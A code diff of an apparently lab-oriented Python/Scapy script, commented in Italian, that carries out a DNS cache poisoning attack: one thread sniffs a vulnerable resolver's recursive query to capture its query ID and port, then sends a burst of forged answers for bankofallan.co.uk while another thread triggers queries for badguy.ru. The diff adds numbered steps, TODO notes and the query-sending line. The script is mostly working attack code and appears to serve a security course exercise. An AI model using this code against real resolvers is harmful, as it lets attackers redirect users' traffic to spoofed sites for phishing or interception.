@@ -3,12 +3,12 @@ FUORI CICLO:
         - il padre inizializza il treno di pacchetti
 
 DENTRO IL CICLO:
-        - il padre manda la richiesta per badguy.ru
-        - il figlio sniffa la richiesta DNS ricorsiva e cattura Q_ID e PORT_UMBER
-        - il figlio prepara l'array di pacchetti risposta per la query a bankofallan.co.uk
-        - il padre fa la richiesta per bankofallan
-        - il figlio invia l'array di pacchetti ONE SHOT
-        - il padre controlla la risposta, se va male si rinizia
+        - 1 il padre manda la richiesta per badguy.ru
+        - 2 il figlio sniffa la richiesta DNS ricorsiva e cattura Q_ID e PORT_UMBER
+        - 3 il figlio prepara l'array di pacchetti risposta per la query a bankofallan.co.uk
+        - 4 il padre fa la richiesta per bankofallan
+        - 5 il figlio invia l'array di pacchetti ONE SHOT
+        - 6 il padre controlla la risposta, se va male si rinizia
 '''
 
 from threading import Thread
@@ -26,7 +26,7 @@ VULN_DNS_IP = "192.168.56.101"
 Q_ID = 0                # query ID globale
 PORT_NUMBER = 0         # porta da catturare
 GOAL = 0                # va a 1 se riesco nell'attacco
-RESTART = 0             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1, cioe' se no poisoning
+RESTART = 1             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1, cioe' se no poisoning
 ERRORI = 0              # condizione di uscita per failure
 N_TRY = 1               # tentativi provati
 L1 = threading.Lock()   # lock
@@ -56,6 +56,7 @@ def sniffer_crafter():
         global Q_ID
         global PORT_NUMBER
 
+        # TODO usare i lock
         pkts = sniff(count=1, timeout=2,
                      filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53",
                      lfilter=lambda pkt: pkt.haslayer(DNS))
@@ -78,7 +79,10 @@ def father_job():
 
         :return:
         '''
-
+        # richiesta per badguy
+        # TODO usare i lock
+        time.sleep(1)
+        send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
 
 def sender_job():
         '''
